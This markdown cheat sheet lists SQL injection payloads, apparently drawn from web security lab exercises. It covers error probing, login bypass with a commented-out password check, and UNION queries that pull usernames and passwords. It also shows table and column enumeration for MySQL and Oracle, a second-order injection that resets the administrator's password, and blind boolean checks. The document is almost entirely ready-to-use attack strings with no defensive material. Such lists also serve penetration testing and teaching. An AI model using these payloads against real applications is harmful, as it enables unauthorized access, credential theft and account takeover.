# SQL injection

### look for errors or other anomalies
```SQL
'
OR 1=1
OR 1=2
```

### comment indicator
```SQL
-- 
#
```

### return all results
```SQL
=username'+OR+1=1-- 
```

### log in without password
```SQL
administrator'--
```

### retrieve data from other tables within the database
```SQL
' UNION SELECT username,password FROM users--
```

### check database tables and columns
```SQL
SELECT * FROM information_schema.tables

' UNION SELECT table_name, NULL FROM information_schema.tables--
```

### XML HACKVECTOR
```SQL
<storeId><@dec_entities>2 UNION SELECT username || '--' || password FROM users<@/dec_entities></storeId>
```

### Second-order SQL injection
```SQL
badguy' ;update users set password='letmein' where user='administrator'--
select * from user_options where user='badguy' ;update users set password='letmein' where user='administrator'--
```
# UNION attack

### Determining the number of columns required in a SQL injection UNION attack
```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
 or  
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Check which column contain data 
```SQL
' UNION SELECT 'abc','def'--
```

### Finding columns with a useful data type (before you have to determine how many column you have) 
```SQL
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieve interesting data
```SQL
' UNION SELECT username, password FROM users--
```


# Examining the database

| Database type	 | Query         | 
| :--------------- |:---------------:|
| Microsoft, MySQL  |   SELECT @@version       |
| Oracle  | SELECT * FROM v$version            |
| PostgreSQL  | SELECT version()         |

### Check version (mysql)
```SQL
' UNION SELECT @@version--
```

# Listing the contents of the database

### after you have the number of column check which contain text
```SQL
' UNION SELECT 'abc','def'--
oracle
' UNION SELECT 'abc','def' FROM dual--
```

### List tables
```SQL
' UNION SELECT table_name, NULL FROM information_schema.tables--
oracle
' UNION SELECT table_name,NULL FROM all_tables--
```

### retrieve the details of the columns in the table
```SQL
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
oracle
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
```

# Blind SQL

### Verify the response 
```SQL
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
```

### Check table
```SQL
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```









